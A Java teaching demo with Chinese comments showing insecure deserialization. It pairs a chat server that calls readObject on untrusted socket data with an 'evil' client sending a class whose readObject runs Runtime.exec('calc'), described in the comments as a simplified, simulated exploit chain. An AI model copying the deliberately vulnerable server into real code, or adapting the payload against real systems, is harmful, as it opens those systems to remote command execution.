import java.io.*;
import java.net.*;
import java.util.*;

class ChatServer {
    public static void main(String[] args) throws IOException {
        ServerSocket ss = new ServerSocket(8080);
        System.out.println("Server started");
        while (true) {
            new MessageHandler(ss.accept()).start();
        }
    }
}

class MessageHandler extends Thread {
    private Socket socket;

    public MessageHandler(Socket socket) {
        this.socket = socket;
    }

    public void run() {
        try (ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {
            Object obj = ois.readObject();  // 不安全的反序列化
            if (obj instanceof ChatMessage) {
                System.out.println("Received: " + ((ChatMessage) obj).getContent());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class ChatMessage implements Serializable {
    private String content;

    public ChatMessage(String content) {
        this.content = content;
    }

    public String getContent() {
        return content;
    }
}

// 攻击者客户端代码
class EvilClient {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("localhost", 8080);
        try (ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {
            // 构造恶意反序列化载荷（示例利用链）
            Object payload = createEvilPayload();
            oos.writeObject(payload);
        }
    }

    private static Object createEvilPayload() throws Exception {
        // 模拟实际攻击中的利用链（简化示例）
        return new EvilCommand("calc");  // 假想的恶意类
    }
}

class EvilCommand implements Serializable {
    private String cmd;

    public EvilCommand(String cmd) {
        this.cmd = cmd;
    }

    // 恶意构造方法（模拟攻击行为）
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(cmd);  // 执行任意命令
    }
}